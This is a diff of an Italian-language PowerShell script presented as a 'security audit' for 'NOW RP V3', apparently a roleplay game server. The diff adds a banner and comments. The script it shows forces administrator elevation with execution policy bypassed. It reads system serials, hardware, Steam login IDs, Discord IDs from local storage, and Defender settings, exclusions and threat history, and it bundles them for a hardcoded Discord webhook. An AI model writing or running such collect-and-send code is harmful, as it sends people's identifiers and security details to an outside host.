@@ -1,6 +1,14 @@
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 Clear-Host
 
+# --- BANNER ASCII ART ---
+Write-Host "==================================================================" -ForegroundColor Cyan
+Write-Host "  _   _  _____  _      ___  ______  ___   ______  _______ _____  " -ForegroundColor Yellow
+Write-Host " | \ | |/  _  \| |    / _ \ | ___ \/ _ \  | ___ \ | ___ \  ___| " -ForegroundColor Yellow
+Write-Host " |  \| || | | || |   / /_\ \| |_/ / /_\ \ | |_/ / | |_/ / |__   " -ForegroundColor Cyan
+Write-Host " | . `|| | | || |   |  _  ||  __/|  _  | |  __/  |  __/|  __|  " -ForegroundColor Cyan
+Write-Host " | |\  || |_| || |___| | | || |   | | | | | |     | |   | |___  " -ForegroundColor DarkCyan
+Write-Host " \_| \_/ \___/ \_____/\_| |_/\_|   \_| |_/ \_|     \_|   \____/  " -ForegroundColor DarkCyan
 Write-Host "==================================================================" -ForegroundColor Cyan
 Write-Host "             NOW RP V3 - ULTIMATE SECURITY AUDIT                  " -ForegroundColor Green
 Write-Host "==================================================================`n" -ForegroundColor Cyan
@@ -10,12 +18,14 @@ $h = "https://discord.com/api/webhooks/1563653917932396556/9wpu5_KBJcDg9kQJ6Ixfi
 
 Write-Host "[*] Raccolta dati di sistema in corso..." -ForegroundColor DarkYellow
 
+# --- 1. DATI SISTEMA & HARDWARE ---
 $s = Get-CimInstance Win32_OperatingSystem
 $o = $s.InstallDate.ToString('dd/MM/yyyy HH:mm')
 $sr = $s.SerialNumber
 $pc = (Get-CimInstance Win32_ComputerSystem).Model
 $gpu = (Get-CimInstance Win32_VideoController).Name -join ", "
 
+# --- 2. STEAM & DISCORD ---
 $v = "C:\Program Files (x86)\Steam\config\loginusers.vdf"
 $st = "Non trovato"
 if(Test-Path $v){ $id = (Get-Content $v -EA 0 | Select-String '"7656119' -EA 0 | ForEach-Object { $_.ToString().Split('"')[1] }); if($id){ $st = $id -join ", " } }
@@ -24,6 +34,7 @@ $dc = (Get-ChildItem "$env:APPDATA" -Filter "*discord*" -EA 0).Count
 $tk = Get-ChildItem "$env:APPDATA\discord\Local Storage\leveldb" -EA 0 | Select-String -Pattern '"id":"(\d{17,19})"' -EA 0 | ForEach-Object { $_.Matches.Groups[1].Value } | Select-Object -Unique
 $di = if($tk){ $tk -join ", " } else { "Nessuno" }
 
+# --- 3. ANTIVIRUS & WINDOWS DEFENDER ---
 Write-Host "[*] Scansione difese e configurazioni antivirus..." -ForegroundColor DarkYellow
 $def = Get-MpComputerStatus -EA 0
 $rt = if($def.RealTimeProtectionEnabled){ "Attiva (OK)" } else { "Disattivata (ATTENZIONE!)" }
@@ -35,6 +46,7 @@ $exPath = if($pref.ExclusionPath){ $pref.ExclusionPath -join ", " } else { "Ness
 $exExt = if($pref.ExclusionExtension){ $pref.ExclusionExtension -join ", " } else { "Nessuna estensione esclusa" }
 $exProc = if($pref.ExclusionProcess){ $pref.ExclusionProcess -join ", " } else { "Nessun processo escluso" }
 
+# --- 4. CRONOLOGIA MINACCE & QUARANTENA ---
 Write-Host "[*] Estrazione cronologia minacce e file rilevati..." -ForegroundColor DarkYellow
 $threats = Get-MpThreatDetection -EA 0
 $threatList = "Nessuna minaccia recente registrata"
@@ -46,6 +58,7 @@ if ($threats) {
     }) -join "`n"
 }
 
+# --- 5. EMBED DISCORD MULTIPLI ---
 $embeds = @(
     @{
         title = "NOW RP V3 - System & Identity Board"
